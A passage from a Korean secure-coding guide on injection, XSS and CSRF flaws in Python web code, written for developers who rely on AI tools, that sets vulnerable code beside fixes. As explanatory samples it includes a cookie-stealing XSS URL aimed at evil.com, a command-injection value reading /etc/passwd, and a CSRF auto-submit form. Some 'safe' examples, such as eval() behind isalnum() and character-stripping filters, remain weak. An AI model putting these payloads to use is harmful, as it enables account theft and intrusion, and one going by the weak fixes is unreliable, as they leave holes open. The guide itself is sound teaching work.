> **⚠️ 주의:** AI 도구에 "사용자가 입력한 수식을 계산해주는 기능 만들어줘"라고 요청하면 `eval()`을 사용하는 코드가 높은 확률로 생성됩니다. 이는 매우 위험합니다.

### 안전한 코드

#### ✅ 안전한 코드: 입력값 검증 후 eval() 사용

```python
from django.shortcuts import render

def route(request):
    message = request.POST.get('message', '')

    # 입력값이 영문과 숫자로만 구성되었는지 검증합니다
    if message.isalnum():
        ret = eval(message)
        return render(request, '/success.html', {'data': ret})

    return render(request, '/error.html')
```

#### ✅ 안전한 코드: 화이트리스트(Whitelist) 기반 함수 실행 제한

```python
from django.shortcuts import render

# 실행 가능한 함수를 사전에 정의합니다
WHITE_LIST = ['get_friends_list', 'get_address', 'get_phone_number']

def request_rest_api(request):
    function_name = request.POST.get('function_name', '')

    # 허용된 함수 목록에 포함된 경우에만 실행합니다
    if function_name in WHITE_LIST:
        exec('{}()'.format(function_name))
        return render(request, '/success.html')

    return render(request, '/error.html', {'error': '허용되지 않은 함수입니다.'})
```

#### ✅ 가장 안전한 코드: eval()/exec() 자체를 사용하지 않기

```python
import ast
from django.shortcuts import render

def calculate(request):
    expression = request.POST.get('expression', '')

    try:
        # ast.literal_eval()은 리터럴 표현식만 평가합니다
        # 함수 호출이나 import 등 위험한 코드는 실행되지 않습니다
        result = ast.literal_eval(expression)
        return render(request, '/success.html', {'data': result})
    except (ValueError, SyntaxError):
        return render(request, '/error.html', {'error': '올바른 값을 입력해주세요.'})
```

> **💡 팁:** 수식 계산이 필요한 경우 `ast.literal_eval()`을 사용하거나, 수학 전용 라이브러리인 `numexpr`, `sympy` 등을 활용하는 것이 `eval()`보다 훨씬 안전합니다.

### 바이브 코딩 시 체크포인트

- [ ] **코드에 `eval()` 또는 `exec()`가 포함되어 있지 않은가?** AI가 생성한 코드에서 이 함수들이 보이면 반드시 대안을 검토하십시오
- [ ] **동적 코드 실행이 정말 필요한가?** 대부분의 경우 `eval()` 없이도 동일한 기능을 구현할 수 있습니다
- [ ] **사용자 입력값이 코드 실행 함수에 직접 전달되지 않는가?** 불가피한 경우 화이트리스트로 실행 가능한 범위를 제한하십시오

---

## 3-2. 운영체제 명령어 삽입(OS Command Injection)

### 개요

운영체제 명령어 삽입(OS Command Injection)은 사용자 입력값이 시스템 명령어의 일부로 사용되어, 공격자가 의도하지 않은 운영체제 명령을 실행할 수 있는 취약점입니다.

파이썬에서는 `os.system()`, `subprocess.run()`, `subprocess.Popen()` 등의 함수가 운영체제 명령어를 실행합니다. 바이브 코딩으로 파일 처리, 시스템 유틸리티 호출, 외부 프로그램 연동 등의 기능을 구현할 때 이 취약점에 노출되기 쉽습니다.

### 왜 위험한가

공격자가 시스템 명령어를 주입하면 서버의 운영체제 수준에서 명령이 실행됩니다. 이는 코드 삽입보다 더 심각한 결과를 초래할 수 있습니다:

- **서버 파일 열람/삭제**: `cat /etc/passwd`, `rm -rf /` 등의 명령 실행 가능
- **악성 프로그램 설치**: `wget`이나 `curl`로 악성코드를 다운로드하여 실행
- **서버 장악**: 리버스 쉘(Reverse Shell)을 열어 서버를 완전히 제어

특수문자 `|`, `;`, `&`, `` ` `` 등을 사용하면 여러 명령어를 연결하여 실행할 수 있습니다:

```bash
# 원래 의도: 날짜를 인자로 백업 실행
backuplog.bat 2024-01-01

# 공격자 입력: 2024-01-01; cat /etc/passwd
# 실제 실행: backuplog.bat 2024-01-01; cat /etc/passwd
```

### 취약한 코드

#### ❌ 취약한 코드: os.system()에 외부 입력값 직접 사용

```python
import os
from django.shortcuts import render

def execute_command(request):
    app_name_string = request.POST.get('app_name', '')

    # 입력 파라미터를 제한하지 않아 외부 입력값으로
    # 전달된 모든 프로그램이 실행될 수 있습니다
    os.system(app_name_string)
    return render(request, '/success.html')
```

#### ❌ 취약한 코드: subprocess에서 shell=True 사용

```python
import subprocess
from django.shortcuts import render

def execute_command(request):
    date = request.POST.get('date', '')

    # shell=True와 문자열 결합은 명령어 삽입의 원인이 됩니다
    cmd_str = "cmd /c backuplog.bat " + date
    subprocess.run(cmd_str, shell=True)
    return render(request, '/success.html')
```

> **⚠️ 주의:** `subprocess.run()`의 `shell=True` 옵션은 중간 프로세스(쉘)를 통해 명령을 실행하므로, 와일드카드(Wildcard) 확장, 환경변수 참조, 명령어 연결 등이 모두 가능해져 매우 위험합니다.

### 안전한 코드

#### ✅ 안전한 코드: 화이트리스트로 실행 가능한 프로그램 제한

```python
import os
from django.shortcuts import render

ALLOW_PROGRAM = ['notepad', 'calc']

def execute_command(request):
    app_name_string = request.POST.get('app_name', '')

    # 허용된 프로그램 목록에 포함되는지 검사합니다
    if app_name_string not in ALLOW_PROGRAM:
        return render(request, '/error.html', {'error': '허용되지 않은 프로그램입니다.'})

    os.system(app_name_string)
    return render(request, '/success.html')
```

#### ✅ 안전한 코드: 특수문자 필터링 + 배열 형태 인자 전달

```python
import subprocess
from django.shortcuts import render

def execute_command(request):
    date = request.POST.get('date', '')

    # 명령어 연결에 사용되는 특수문자를 필터링합니다
    for word in ['|', ';', '&', ':', '>', '<', '`', '\\', '!']:
        date = date.replace(word, "")

    # shell=True를 사용하지 않고, 명령과 인자를 배열로 전달합니다
    subprocess.run(["cmd", "/c", "backuplog.bat", date])
    return render(request, '/success.html')
```

> **💡 팁:** `subprocess` 사용 시 `shell=True`를 절대 사용하지 마십시오. 명령어와 인자를 리스트(List) 형태로 분리하여 전달하면 쉘 해석 과정 없이 직접 실행되므로 훨씬 안전합니다.

### 바이브 코딩 시 체크포인트

- [ ] **`os.system()` 대신 `subprocess.run()`을 리스트 인자로 사용하고 있는가?**
- [ ] **`shell=True` 옵션이 사용되고 있지 않은가?**
- [ ] **사용자 입력이 명령어의 일부로 사용된다면 특수문자 필터링이 적용되어 있는가?**
- [ ] **정말 시스템 명령어를 호출해야 하는가?** 파이썬 내장 라이브러리로 대체할 수 있는 경우가 많습니다 (예: `shutil` 모듈로 파일 복사)

---

## 3-3. XML 삽입(XML Injection)

### 개요

XML 삽입(XML Injection)은 XQuery 또는 XPath 쿼리문에 검증되지 않은 외부 입력값이 포함되어, 공격자가 쿼리 구조를 변경하고 허가되지 않은 데이터에 접근할 수 있는 보안약점입니다.

바이브 코딩 환경에서 XML 데이터를 직접 다루는 경우는 비교적 적지만, 레거시 시스템(Legacy System)과의 연동이나 SOAP API 호출 시 이 취약점을 마주할 수 있습니다.

### 왜 위험한가

XML 기반 데이터 조회에서 XPath를 사용할 때, SQL 삽입과 동일한 원리로 쿼리가 변조될 수 있습니다:

```xpath
# 원래 의도된 쿼리
/collection/users/user[@name='kim']/home/text()

# 공격자가 name에 ' or '1'='1 입력 시
/collection/users/user[@name='' or '1'='1']/home/text()
```

이렇게 되면 모든 사용자의 정보가 노출됩니다.

### 취약한 코드

#### ❌ 취약한 코드: XPath 쿼리에 문자열 결합 사용

```python
from django.shortcuts import render
from lxml import etree

def parse_xml(request):
    user_name = request.POST.get('user_name', '')
    parser = etree.XMLParser(resolve_entities=False)
    tree = etree.parse('user.xml', parser)
    root = tree.getroot()

    # 검증되지 않은 입력값을 문자열 결합으로 쿼리에 포함합니다
    query = "/collection/users/user[@name='" + user_name + "']/home/text()"
    elmts = root.xpath(query)

    return render(request, 'parse_xml.html', {'xml_element': elmts})
```

### 안전한 코드

#### ✅ 안전한 코드: XPath 파라미터 바인딩 사용

```python
from django.shortcuts import render
from lxml import etree

def parse_xml(request):
    user_name = request.POST.get('user_name', '')
    parser = etree.XMLParser(resolve_entities=False)
    tree = etree.parse('user.xml', parser)
    root = tree.getroot()

    # 외부 입력값을 $paramname으로 인자화하여 사용합니다
    query = '/collection/users/user[@name = $paramname]/home/text()'
    elmts = root.xpath(query, paramname=user_name)

    return render(request, 'parse_xml.html', {'xml_element': elmts})
```

> **💡 팁:** `lxml` 라이브러리의 XPath는 `$변수명` 형식의 파라미터 바인딩을 지원합니다. SQL의 인자화된 쿼리와 동일한 원리이므로, 항상 파라미터 바인딩을 사용하십시오.

---

## 3-4. 포맷 스트링 삽입(Format String Injection)

### 개요

포맷 스트링 삽입(Format String Injection)은 파이썬의 f-string이나 `.format()` 메서드를 사용할 때, 사용자 입력값이 포맷 문자열 자체에 포함되어 의도하지 않은 정보가 노출되는 취약점입니다.

전통적인 C 언어의 포맷 스트링 공격과는 다소 다르지만, 파이썬에서도 `.format()` 메서드를 통해 객체의 속성(Attribute)에 접근하거나 내부 정보를 유출할 수 있습니다.

### 왜 위험한가

파이썬의 `.format()` 메서드는 객체의 속성에 접근하는 기능을 제공합니다. 공격자가 이를 악용하면 서버의 내부 정보를 탈취할 수 있습니다:

```python
# 의도된 사용
"Hello, {name}!".format(name="Kim")

# 공격자가 name에 다음과 같은 값을 전달하면?
# {user.__class__.__init__.__globals__}
# -> 글로벌 변수에 저장된 비밀키, 설정값 등이 노출됩니다
```

### 취약한 코드

#### ❌ 취약한 코드: 사용자 입력으로 포맷 문자열 구성

```python
from django.shortcuts import render

def greeting(request):
    template = request.POST.get('template', '')

    # 사용자 입력을 포맷 문자열 자체로 사용하면 위험합니다
    message = template.format(user=request.user)
    return render(request, '/greeting.html', {'message': message})
```

#### ❌ 취약한 코드: f-string에서의 위험한 패턴

```python
from django.shortcuts import render

def render_message(request):
    user_input = request.POST.get('input', '')

    # 사용자 입력을 eval()과 f-string으로 결합하면 코드 실행이 가능합니다
    # 이 패턴은 AI가 "동적 메시지 생성"을 구현할 때 생성할 수 있습니다
    message = eval(f"f'{user_input}'")
    return render(request, '/result.html', {'message': message})
```

> **⚠️ 주의:** `eval()`과 f-string의 조합은 코드 삽입과 포맷 스트링 삽입이 동시에 발생하는 매우 위험한 패턴입니다. AI가 이런 코드를 생성하면 즉시 수정하십시오.

### 안전한 코드

#### ✅ 안전한 코드: 고정된 포맷 문자열 사용

```python
from django.shortcuts import render

def greeting(request):
    name = request.POST.get('name', '')

    # 포맷 문자열은 코드에서 고정하고, 사용자 입력은 인자로만 전달합니다
    message = "안녕하세요, {}님!".format(name)
    return render(request, '/greeting.html', {'message': message})
```

#### ✅ 안전한 코드: Django 템플릿 활용

```python
from django.shortcuts import render

def greeting(request):
    name = request.POST.get('name', '')

    # Django 템플릿에서 변수를 렌더링하면 자동으로 이스케이프됩니다
    return render(request, '/greeting.html', {'name': name})
```

```html
<!-- greeting.html -->
<p>안녕하세요, {{ name }}님!</p>
```

> **💡 팁:** 동적 메시지 생성이 필요한 경우, 포맷 문자열을 코드에 고정하고 사용자 입력은 **인자(Argument)**로만 전달하십시오. 사용자가 포맷 문자열 자체를 제어할 수 있게 하면 안 됩니다.

### 바이브 코딩 시 체크포인트

- [ ] **사용자 입력이 `.format()` 또는 f-string의 템플릿 부분에 사용되고 있지 않은가?**
- [ ] **`eval()`과 f-string이 조합되어 있지 않은가?**
- [ ] **동적 메시지는 Django/Flask 템플릿으로 처리하고 있는가?**
- [ ] **포맷 문자열은 코드에 하드코딩(Hardcode)되어 있는가?**


---

# Chapter 04. 웹 요청을 노리는 공격

## 4-1. 크로스사이트 스크립트(XSS)

### XSS 3가지 유형 비교도

#### ① 저장형 XSS (Stored XSS)

```
 ┌─────────────┐         ┌─────────────────┐         ┌─────────────┐         ┌─────────────┐
 │   공격자     │         │    웹 서버       │         │  데이터베이스  │         │  피해자 브라우저│
 │             │         │                 │         │             │         │             │
 │ <script>    │         │   게시글 저장     │         │ 악성 스크립트 │         │ ⚠ 스크립트   │
 │ 악성코드     │ ══════▶ │   처리           │ ══════▶ │ DB에 저장됨  │         │   자동 실행!  │
 │ </script>   │         │                 │         │             │         │             │
 └─────────────┘         └─────────────────┘         └─────────────┘         └─────────────┘
                                                           │                       ▲
                                                           │    피해자가 해당       │
                                                           │    페이지 접속 시      │
                                                           └───────────────────────┘
                                                              DB에서 읽어 응답에
                                                              포함하여 전달 ══════▶

  특징: 악성코드가 서버에 영구 저장 ──▶ 해당 페이지 방문하는 모든 사용자 피해
```

#### ② 반사형 XSS (Reflected XSS)

```
 ┌─────────────┐         ┌─────────────┐         ┌─────────────────┐         ┌─────────────┐
 │   공격자     │         │   피해자     │         │    웹 서버       │         │ 피해자 브라우저│
 │             │         │             │         │                 │         │             │
 │ 악성 URL    │         │ 링크 클릭    │         │  URL 파라미터를  │         │ ⚠ 스크립트   │
 │ 제작 및 전송 │ ══════▶ │             │ ══════▶ │  응답에 반사     │ ══════▶ │   실행됨!    │
 │             │         │             │         │                 │         │             │
 └─────────────┘         └─────────────┘         └─────────────────┘         └─────────────┘
       ①                       ②                        ③                        ④
  example.com/search       피해자가 악성            서버가 검색어를              반사된 스크립트가
  ?q=<script>...</script>  링크를 클릭             그대로 HTML에 포함           브라우저에서 실행

  특징: 악성코드가 서버에 저장되지 않음 ──▶ URL을 통해 1회성 공격
```

#### ③ DOM 기반 XSS (DOM-based XSS)

```
 ┌─────────────┐         ┌──────────────────────────────────────────────┐
 │   공격자     │         │            피해자 브라우저                     │
 │             │         │                                              │
 │ 악성 URL    │         │  ┌────────────────┐    ┌─────────────────┐   │
 │ 제작 및 전송 │ ══════▶ │  │ 자바스크립트가  │    │ ⚠ DOM 조작으로   │   │
 │             │         │  │ URL 해시값을    │══▶│   악성코드 실행!  │   │
 │             │         │  │ 직접 DOM에 삽입 │    │                 │   │
 └─────────────┘         │  └────────────────┘    └─────────────────┘   │
       ①                 │         ②                      ③             │
  example.com/#           │   클라이언트 JS가           DOM에 삽입된       │
  <script>...</script>   │   location.hash 읽어       스크립트 실행       │
                         │   innerHTML에 삽입                            │
                         └──────────────────────────────────────────────┘
                                서버를 거치지 않음!
                                ─ ─ ─ ─ ─▶ 서버 (관여하지 않음)

  특징: 서버 통신 없이 브라우저 내에서만 발생 ──▶ 서버 로그에 흔적 없음
```

#### 세 유형 비교 요약

```
  ┌────────────┬──────────────────┬──────────────────┬──────────────────┐
  │    구분     │   저장형 XSS     │   반사형 XSS     │  DOM 기반 XSS    │
  ├────────────┼──────────────────┼──────────────────┼──────────────────┤
  │ 악성코드    │ 서버 DB에 저장    │ URL에 포함       │ URL에 포함       │
  │ 위치       │                  │                  │                  │
  ├────────────┼──────────────────┼──────────────────┼──────────────────┤
  │ 서버 경유   │ ✅ 예            │ ✅ 예            │ ❌ 아니오        │
  ├────────────┼──────────────────┼──────────────────┼──────────────────┤
  │ 지속성      │ 영구적           │ 1회성            │ 1회성            │
  ├────────────┼──────────────────┼──────────────────┼──────────────────┤
  │ 위험도      │ ★★★ 높음        │ ★★ 중간          │ ★★ 중간          │
  └────────────┴──────────────────┴──────────────────┴──────────────────┘
```

### 개요

크로스사이트 스크립트(Cross-Site Scripting, XSS)는 웹 보안에서 가장 빈번하게 발생하는 취약점 중 하나입니다. 공격자가 웹 애플리케이션에 악성 스크립트(Script)를 삽입하여, 해당 페이지를 방문하는 다른 사용자의 브라우저에서 악성 코드가 실행되도록 만드는 공격입니다.

바이브 코딩으로 웹사이트를 만들 때, 사용자 입력을 화면에 출력하는 기능은 거의 모든 웹사이트에 존재합니다. 게시판, 댓글, 프로필, 검색 결과 등 어디서든 XSS 취약점이 발생할 수 있으므로, 여러분이 만드는 모든 웹페이지에서 이 취약점을 반드시 확인해야 합니다.

### 왜 위험한가

XSS 공격이 성공하면 공격자는 피해자의 브라우저에서 자바스크립트(JavaScript)를 실행할 수 있습니다:

> 세션(Session)이란 서버가 사용자를 식별하기 위해 유지하는 상태 정보이며, 쿠키(Cookie)는 이 정보를 브라우저에 저장하는 메커니즘입니다.

- **세션 탈취**: `document.cookie`를 통해 로그인 세션을 훔쳐 계정을 장악합니다

> **💡 팁:** 쿠키 보안 설정에 대한 자세한 내용은 11장 11-1절을 참고하십시오.

- **키로깅(Keylogging)**: 사용자의 키보드 입력을 기록하여 비밀번호를 탈취합니다
- **피싱**: 가짜 로그인 폼을 삽입하여 사용자 인증 정보를 수집합니다
- **악성코드 배포**: 방문자의 브라우저를 통해 악성 프로그램을 다운로드시킵니다
- **웹사이트 변조**: 페이지 내용을 임의로 수정하여 가짜 정보를 표시합니다

XSS 공격은 세 가지 유형으로 분류됩니다:

**유형 1 — 반사형 XSS(Reflected XSS)**

공격 스크립트가 URL 등의 요청에 포함되어 서버 응답에 그대로 반사(Reflected)되는 방식입니다. 공격자는 악성 스크립트가 포함된 링크를 피해자에게 전송하고, 피해자가 해당 링크를 클릭하면 스크립트가 실행됩니다.

```text
https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

**유형 2 — 저장형 XSS(Stored XSS)**

공격 스크립트가 서버의 데이터베이스에 저장되어, 해당 데이터를 조회하는 모든 사용자에게 영향을 미치는 방식입니다. 게시판, 댓글, 프로필 페이지 등이 대표적인 공격 대상입니다. 반사형보다 훨씬 위험한 이유는 **한 번의 공격으로 다수의 피해자**가 발생하기 때문입니다.

**유형 3 — DOM 기반 XSS(DOM XSS)**

서버를 거치지 않고 클라이언트 측 자바스크립트에서 DOM(Document Object Model)을 조작하여 발생하는 XSS입니다. URL의 해시(#) 값이나 `location.search` 등을 통해 전달된 데이터가 검증 없이 DOM에 삽입될 때 발생합니다.

```javascript
// 위험한 DOM 조작의 예
document.getElementById('output').innerHTML = location.hash.substring(1);
```

### 취약한 코드

#### ❌ 취약한 코드: Django에서 mark_safe() 오용

```python
from django.shortcuts import render
from django.utils.safestring import mark_safe

def profile_link(request):
    # 외부 입력값을 검증 없이 HTML 태그 생성에 사용
    profile_url = request.POST.get('profile_url')
    profile_name = request.POST.get('profile_name')
    object_link = '<a href="{}">{}</a>'.format(profile_url, profile_name)

    # mark_safe()는 Django의 XSS 이스케이프 정책을 무력화합니다
    object_link = mark_safe(object_link)
    return render(request, 'my_profile.html', {'object_link': object_link})
```

`mark_safe()`는 Django에게 "이 문자열은 안전하니 이스케이프하지 마라"고 알려주는 함수입니다. 신뢰할 수 없는 사용자 입력에 이 함수를 사용하면 XSS 보호가 완전히 해제됩니다.

#### ❌ 취약한 코드: Django 템플릿에서 autoescape off 사용

```html
<!doctype html>
<html>
<body>
    <div class="content">
        {% autoescape off %}
        <!-- autoescape off로 설정하면 XSS 공격에 노출됩니다 -->
        {{ content }}
        {% endautoescape %}
    </div>
    <div class="content2">
        <!-- safe 필터도 XSS 보호를 해제합니다 -->
        {{ content | safe }}
    </div>
</body>
</html>
```

> **⚠️ 주의:** AI 도구에 "HTML 태그가 그대로 보여야 해"라고 요청하면 `| safe` 필터나 `autoescape off`를 사용하는 코드가 생성될 수 있습니다. 이는 XSS 보호를 완전히 해제하는 것이므로 매우 위험합니다.

#### ❌ 취약한 코드: Flask에서 검증 없이 동적 페이지 생성

```python
from flask import Flask, request, render_template

@app.route('/search', methods=['POST'])
def search():
    search_keyword = request.form.get('search_keyword')

    # 사용자의 입력을 검증이나 치환 없이 동적 웹페이지에 사용합니다
    return render_template('search.html', search_keyword=search_keyword)
```

#### ❌ 취약한 코드: JavaScript에서의 DOM XSS

```html
<script>
// URL 파라미터를 그대로 DOM에 삽입하면 XSS가 발생합니다
const params = new URLSearchParams(window.location.search);
const keyword = params.get('q');

// innerHTML은 HTML을 파싱하므로 스크립트가 실행될 수 있습니다
document.getElementById('search-result').innerHTML =
    '검색어: ' + keyword;
</script>
```

### 안전한 코드

#### ✅ 안전한 코드: Django에서 mark_safe() 제거

```python
from django.shortcuts import render

def profile_link(request):
    profile_url = request.POST.get('profile_url')
    profile_name = request.POST.get('profile_name')
    object_link = '<a href="{}">{}</a>'.format(profile_url, profile_name)

    # mark_safe()를 사용하지 않으면 Django가 자동으로 이스케이프합니다
    return render(request, 'my_profile.html', {'object_link': object_link})
```

#### ✅ 안전한 코드: Django 템플릿에서 autoescape on 유지

```html
<!doctype html>
<html>
<body>
    <div class="content">
        {% autoescape on %}
        <!-- autoescape on으로 XSS 공격을 방지합니다 -->
        {{ content }}
        {% endautoescape %}
    </div>
    <div class="content2">
        <!-- safe 필터를 사용하지 않습니다 -->
        {{ content }}
    </div>
</body>
</html>
```

> **💡 팁:** Django 템플릿은 기본적으로 `autoescape on`이 적용되어 있습니다. 특별한 이유가 없다면 이 설정을 변경하지 마십시오. `autoescape off`가 포함된 공통 템플릿을 `include`하거나 `extends`하면 해당 설정이 하위 템플릿까지 전파되므로 특히 주의해야 합니다.

#### ✅ 안전한 코드: Flask에서 html.escape() 사용

```python
import html
from flask import Flask, request, render_template

@app.route('/search', methods=['POST'])
def search():
    search_keyword = request.form.get('search_keyword')

    # HTML 엔티티 코드로 치환하여 스크립트 실행을 방지합니다
    escape_keyword = html.escape(search_keyword)
    return render_template('search.html', search_keyword=escape_keyword)
```

`html.escape()`는 `&`, `<`, `>`, `"`, `'` 등의 특수문자를 `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#x27;`로 변환합니다.

#### ✅ 안전한 코드: JavaScript에서 textContent 사용

```html
<script>
const params = new URLSearchParams(window.location.search);
const keyword = params.get('q');

// textContent는 HTML을 파싱하지 않으므로 XSS에 안전합니다
document.getElementById('search-result').textContent =
    '검색어: ' + keyword;
</script>
```

> **💡 팁:** JavaScript에서 DOM을 조작할 때 `innerHTML` 대신 `textContent`를 사용하면 HTML 태그가 파싱되지 않아 XSS를 방지할 수 있습니다. HTML 구조를 동적으로 생성해야 하는 경우에는 `createElement()`와 `textContent`를 조합하십시오.

### 바이브 코딩 시 체크포인트

- [ ] **`mark_safe()`, `| safe`, `autoescape off`를 사용하고 있지 않은가?** 이 세 가지는 Django의 XSS 보호를 해제합니다
- [ ] **Flask에서 `html.escape()`를 사용하고 있는가?** Jinja2 템플릿의 자동 이스케이프만으로는 부족한 경우가 있습니다
- [ ] **JavaScript에서 `innerHTML`을 사용하고 있지 않은가?** `textContent`나 `createElement()`를 사용하십시오
- [ ] **사용자 입력이 HTML 속성에 들어가는 경우 따옴표로 감싸져 있는가?**
- [ ] **리치 텍스트 에디터(Rich Text Editor)를 사용하는 경우 서버 측 HTML 정화(Sanitization) 라이브러리를 적용했는가?** `bleach` 라이브러리 등을 사용하십시오

---

## 4-2. 크로스사이트 요청 위조(CSRF)

### CSRF 공격 흐름도

#### 공격 흐름 전체도

```
  ┌─────────────┐                              ┌─────────────────┐
  │  정상 웹사이트 │                              │   공격자 서버    │
  │ (은행, 쇼핑몰) │                              │ (evil.com)     │
  └──────┬──────┘                              └────────┬────────┘
         │                                              │
         │  ① 정상 로그인                                │
         │◀══════════════════╗                          │
         │  세션 쿠키 발급     ║                          │
         │══════════════════▶║                          │
         │                   ║                          │
         │            ┌──────╨──────┐                   │
         │            │   피해자     │                   │
         │            │  (사용자)    │                   │
         │            └──────┬──────┘                   │
         │                   │                          │
         │                   │  ② 공격자 페이지 방문       │
         │                   │  (메일 링크, 게시글 등)     │
         │                   │════════════════════════▶ │
         │                   │                          │
         │                   │  ③ 숨겨진 요청 자동 전송    │
         │◀══════════════════╪══════════════════════════│
         │  공격자가 심어둔    │  <img src="bank.com/     │
         │  위조 요청 수신     │   transfer?to=공격자      │
         │  + 피해자 쿠키 포함 │   &amount=1000000">     │
         │                   │                          │
         │  ④ 정상 요청으로    │                          │
         │  판단하여 처리      │                          │
         │══════════════════▶│                          │
         │  송금 완료!        │                          │
         │                   │                          │
```

#### 단계별 상세 설명

```
  ┌─────────────────────────────────────────────────────────────────┐
  │ ① 사용자가 정상 사이트에 로그인                                    │
  │                                                                 │
  │   사용자 ──────▶ bank.com/login                                  │
  │           ◀──────  세션 쿠키: SESSION_ID=abc123                   │
  │                                                                 │
  │   ┌─────────────────────────────────┐                           │
  │   │ 브라우저 쿠키 저장소              │                           │
  │   │ bank.com → SESSION_ID=abc123    │                           │
  │   └─────────────────────────────────┘                           │
  └─────────────────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────────────────┐
  │ ② 사용자가 공격자 페이지 방문 (로그아웃하지 않은 상태)               │
  │                                                                 │
  │   사용자 ══════▶ evil.com/free-gift.html                         │
  │                  (이메일 링크, SNS, 광고 등으로 유도)               │
  └─────────────────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────────────────┐
  │ ③ 공격자 페이지가 자동으로 위조 요청 전송                           │
  │                                                                 │
  │   evil.com 페이지 내 숨겨진 코드:                                  │
  │   ┌───────────────────────────────────────┐                     │
  │   │ <form action="bank.com/transfer"      │                     │
  │   │       method="POST" id="attack">      │                     │
  │   │   <input name="to" value="공격자계좌"> │                     │
  │   │   <input name="amount" value="100만"> │                     │
  │   │ </form>                               │                     │
  │   │ <script>attack.submit()</script>      │                     │
  │   └───────────────────────────────────────┘                     │
  │                        │                                        │
  │                        ══════▶ bank.com에 자동 전송              │
  │                                + 브라우저가 쿠키 자동 첨부!        │
  └─────────────────────────────────────────────────────────────────┘

  ┌─────────────────────────────────────────────────────────────────┐
  │ ④ 서버는 정상 요청으로 판단                                       │
  │                                                                 │
  │   bank.com 서버:                                                │
  │   ┌─────────────────────────────────────┐                       │
  │   │ 쿠키 확인 → SESSION_ID=abc123 ✅    │                       │
  │   │ 사용자 인증 확인됨                    │                       │
  │   │ 송금 요청 처리 → 완료!              │                       │
  │   └─────────────────────────────────────┘                       │
  │                                                                 │
  │   ⚠ 서버는 이 요청이 사용자 의도인지 공격자 의도인지 구분 불가        │
  └─────────────────────────────────────────────────────────────────┘
```

#### ✅ 방어: CSRF 토큰 적용 시

```
  ┌─────────────┐         ┌─────────────────┐         ┌─────────────────┐
  │  공격자 서버  │         │    웹 서버       │         │    결과          │
  │             │         │                 │         │                 │
  │ 위조 요청    │         │ CSRF 토큰 검증   │         │ ✅ 요청 거부     │
  │ (토큰 없음)  │ ══════▶ │ 토큰 불일치!     │ ──────▶ │   공격 차단됨    │
  │             │         │                 │         │                 │
  └─────────────┘         └─────────────────┘         └─────────────────┘

  공격자는 CSRF 토큰 값을 알 수 없음 ──▶ 유효한 요청 위조 불가능
```

### 개요

크로스사이트 요청 위조(Cross-Site Request Forgery, CSRF)는 사용자가 인지하지 못한 상황에서, 공격자가 의도한 행위(데이터 수정, 삭제, 등록 등)를 사용자 명의로 수행하게 만드는 공격입니다.

사용자가 웹사이트에 로그인한 상태에서 공격자가 만든 악성 페이지를 방문하면, 해당 페이지에서 사용자의 인증 정보(쿠키)를 이용하여 원래 사이트에 요청을 보냅니다. 서버는 이 요청이 사용자 본인의 의도인지 구분할 수 없습니다.

### 왜 위험한가

> **💡 팁:** 세션과 쿠키의 보안 설정은 11장 11-1절에서 자세히 다룹니다.

CSRF 공격의 대표적인 시나리오를 살펴보겠습니다:

1. 여러분이 만든 쇼핑몰에 사용자가 로그인합니다
2. 사용자가 다른 탭에서 공격자의 웹페이지를 방문합니다
3. 공격자의 페이지에는 다음과 같은 숨겨진 폼이 있습니다:

```html
<!-- 공격자의 페이지에 숨겨진 폼 -->
<form action="https://your-shop.com/transfer" method="POST" id="evil-form">
    <input type="hidden" name="to" value="attacker_account" />
    <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.getElementById('evil-form').submit();</script>
```

4. 사용자의 브라우저가 자동으로 로그인 쿠키를 포함하여 요청을 보냅니다
5. 서버는 정상 요청으로 판단하여 송금을 처리합니다

### 취약한 코드

#### ❌ 취약한 코드: Django 미들웨어에서 CSRF 비활성화

```python
# settings.py
MIDDLEWARE = [
    'django.contrib.sessions.middleware.SessionMiddleware',
    # CSRF 미들웨어를 주석 처리하면 전역적으로 CSRF 보호가 해제됩니다
    # 'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.locale.LocaleMiddleware',
]
```

#### ❌ 취약한 코드: @csrf_exempt 데코레이터 사용

```python
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt

# csrf_exempt 데코레이터로 CSRF 보호를 해제합니다
@csrf_exempt
def pay_to_point(request):
    user_id = request.POST.get('user_id', '')
    pay = request.POST.get('pay', '')
    product_info = request.POST.get('product_info', '')
    ret = handle_pay(user_id, pay, product_info)
    return render(request, '/view_wallet.html', {'wallet': ret})
```

#### ❌ 취약한 코드: 템플릿에서 csrf_token 누락

```html
<!--html page-->
<form action="" method="POST">
    <!-- form 태그 내부에 csrf_token이 없습니다 -->
    <table>
        {{ form.as_table }}
    </table>
    <input type="submit"/>
</form>
```

> **⚠️ 주의:** AI 도구가 "403 Forbidden 에러가 나요"라는 질문에 대해 `@csrf_exempt`를 추가하거나 CSRF 미들웨어를 제거하라고 답변하는 경우가 있습니다. 이는 문제를 해결하는 것이 아니라 보안 기능을 무력화하는 것입니다.

### 안전한 코드

#### ✅ 안전한 코드: Django CSRF 미들웨어 활성화

```python
# settings.py
MIDDLEWARE = [
    'django.contrib.sessions.middleware.SessionMiddleware',
    # CSRF 미들웨어를 반드시 활성화합니다
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.locale.LocaleMiddleware',
]
```

#### ✅ 안전한 코드: @csrf_exempt 제거

```python
from django.shortcuts import render

# csrf_exempt 데코레이터를 제거합니다
def pay_to_point(request):
    user_id = request.POST.get('user_id', '')
    pay = request.POST.get('pay', '')
    product_info = request.POST.get('product_info', '')
    ret = handle_pay(user_id, pay, product_info)
    return render(request, '/view_wallet.html', {'wallet': ret})
```

#### ✅ 안전한 코드: Django 템플릿에 csrf_token 추가

```html
<!--html page-->
<form action="" method="POST">
    {% csrf_token %}  <!-- CSRF 토큰을 반드시 포함합니다 -->
    <table>
        {{ form.as_table }}
    </table>
    <input type="submit"/>
</form>
```

#### ✅ 안전한 코드: Flask에서 CSRF 보호 설정

```python
from flask import Flask
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')

# CSRF 보호를 활성화합니다
